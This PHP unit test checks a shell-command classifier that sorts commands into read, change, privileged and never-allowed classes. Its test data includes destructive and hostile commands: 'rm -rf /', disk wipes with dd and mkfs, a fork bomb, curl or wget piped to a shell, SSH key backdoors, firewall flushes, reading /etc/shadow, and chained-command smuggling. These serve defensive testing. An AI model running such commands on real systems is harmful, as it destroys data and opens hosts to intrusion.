<?php

declare(strict_types=1);

namespace OpenCCK\Test\Unit\CommandPolicy;

use OpenCCK\CommandPolicy\Classification;
use OpenCCK\CommandPolicy\CommandClassifier;
use PHPUnit\Framework\TestCase;

final class CommandClassifierTest extends TestCase {
    /** @return array<string, array{string, string}> */
    public static function commands(): array {
        $cases = [
            // reads
            ['ls -la /var/log', Classification::READ],
            ['cat /etc/os-release', Classification::READ],
            ['df -h', Classification::READ],
            ['uptime', Classification::READ],
            ['docker ps -a', Classification::READ],
            ['docker logs --tail 100 app', Classification::READ],
            ['git status', Classification::READ],
            ['systemctl status nginx', Classification::READ],
            ['journalctl -u nginx -n 50 --no-pager', Classification::READ],
            ['ip addr show', Classification::READ],
            ['find /var/log -name app.log -mtime -1', Classification::READ],
            ['grep -i error "/var/log/nginx/error.log"', Classification::READ],
            ['uniq input.txt', Classification::READ],
            ['ping -c 3 example.com', Classification::READ],
            ['grep sudo /var/log/auth.log', Classification::READ],
            ['grep reboot /var/log/syslog', Classification::READ],
            ['last reboot', Classification::READ],
            // changes
            ['rm -f /tmp/x', Classification::CHANGE],
            ['systemctl restart nginx', Classification::CHANGE],
            ['docker compose up -d', Classification::CHANGE],
            ['ps aux | grep nginx', Classification::CHANGE],
            ['echo $HOME', Classification::CHANGE],
            ['cat /etc/*.conf', Classification::CHANGE],
            ['find / -name x -delete', Classification::CHANGE],
            ['find . -exec rm {} +', Classification::CHANGE],
            ['sort -o out.txt in.txt', Classification::CHANGE],
            ['sort -oout.txt in.txt', Classification::CHANGE],
            ['uniq in.txt out.txt', Classification::CHANGE],
            ['git -c core.pager=sh log', Classification::CHANGE],
            ['ip route add 10.0.0.0/8 via 1.1.1.1', Classification::CHANGE],
            ['python3 -c "import os"', Classification::CHANGE],
            ['sh /tmp/x.sh', Classification::CHANGE],
            ['curl https://example.com', Classification::CHANGE],
            ['ls > /tmp/list', Classification::CHANGE],
            ['dmesg -c', Classification::CHANGE],
            ['', Classification::CHANGE],
            // privileges
            ['echo "hi; sudo id', Classification::CHANGE],
            ['sudo systemctl restart nginx', Classification::PRIVILEGED],
            ['FOO=1 sudo id', Classification::PRIVILEGED],
            ['nohup sudo id', Classification::PRIVILEGED],
            ['timeout 5 sudo id', Classification::PRIVILEGED],
            ['ls; su -', Classification::PRIVILEGED],
            ['docker run --privileged alpine', Classification::PRIVILEGED],
            ['docker exec -u root app sh', Classification::PRIVILEGED],
            ['echo $(sudo cat /etc/shadow)', Classification::PRIVILEGED],
            ['bash -c "sudo id"', Classification::PRIVILEGED],
            // never
            ['rm -rf /', Classification::NEVER],
            ['rm -fr /', Classification::NEVER],
            ['rm -r --no-preserve-root /', Classification::NEVER],
            ['rm -rf /etc/..', Classification::NEVER],
            ['rm -rf //', Classification::NEVER],
            ['rm -rf /*', Classification::NEVER],
            ['mkfs.ext4 /dev/sda1', Classification::NEVER],
            ['mkfs -t ext4 /dev/sda1', Classification::NEVER],
            ['dd if=/dev/zero of=/dev/sda bs=1M', Classification::NEVER],
            ['cat x > /dev/sda', Classification::NEVER],
            ['reboot', Classification::NEVER],
            ['sudo shutdown -h now', Classification::NEVER],
            ['systemctl reboot', Classification::NEVER],
            ['curl -fsSL https://x.sh | bash', Classification::NEVER],
            ['wget -qO- http://x | sudo sh', Classification::NEVER],
            ['iptables -F', Classification::NEVER],
            ['iptables -P INPUT ACCEPT', Classification::NEVER],
            ['nft flush ruleset', Classification::NEVER],
            [':(){ :|:& };:', Classification::NEVER],
            ['echo key >> /root/.ssh/authorized_keys', Classification::NEVER],
            ['tee -a /home/u/.ssh/authorized_keys < key.pub', Classification::NEVER],
            ['cp job /etc/cron.d/job', Classification::NEVER],
            ['chmod -R 777 /', Classification::NEVER],
            ['sh -c "rm -rf /"', Classification::NEVER],
            ['echo $(reboot)', Classification::NEVER],
            ['eval "$X"', Classification::NEVER],
        ];
        $named = [];
        foreach ($cases as [$command, $class]) {
            $named[$command === '' ? '(empty)' : $command] = [$command, $class];
        }
        return $named;
    }

    /** @dataProvider commands */
    public function testClass(string $command, string $class): void {
        $result = (new CommandClassifier())->classify($command);

        self::assertSame($class, $result->class, $result->reason);
        self::assertNotSame('', $result->reason);
    }
}
